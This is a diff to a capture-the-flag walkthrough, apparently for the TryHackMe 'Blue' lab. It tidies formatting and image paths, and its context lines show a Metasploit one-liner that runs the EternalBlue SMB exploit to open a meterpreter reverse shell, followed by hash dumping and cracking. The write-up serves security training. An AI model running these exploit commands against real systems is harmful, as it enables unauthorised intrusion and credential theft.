@@ -57,8 +57,10 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/
 
  ### // Backgrounding the shell example    
 
-     background  
-
+```  
+background  
+```  
+  
 > Ctrl-z does the same thing  
 
  ![](/thm-blue/thm-blue-background-example.png)
@@ -92,9 +94,11 @@ use shell_to_meterpreter
  > The script ran, but we don't have an upgraded shell...
 
  ### // Hmmm. Thats not working...  
+ 
  For some reason, the script isn't upgrading our shell. No worries, a meterpreter shell is the default when a payload isn't set for the eternal blue exploit.
 
  ### // Let's try again  
+
 ```  
 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOSTS $IP;set LHOST tun0;run"  
 ```  
@@ -104,7 +108,7 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOSTS $IP;set L
 
  ### Session has started with default meterpreter shell  
 
- ![](../thm-blue-meterpreter-session-started.png)
+ ![](/thm-blue/thm-blue-meterpreter-session-started.png)
 
  ### List the current processes running on the target  
 
@@ -122,7 +126,7 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOSTS $IP;set L
 
  ![](/thm-blue/thm-blue-meterpreter-hashdump.png)  
 
- ### Quick and dirty Crackstation  
+ ### Quick and dirty hash crack using Crackstation  
 
  ![](/thm-blue/thm-blue-crackstation.png)  
 
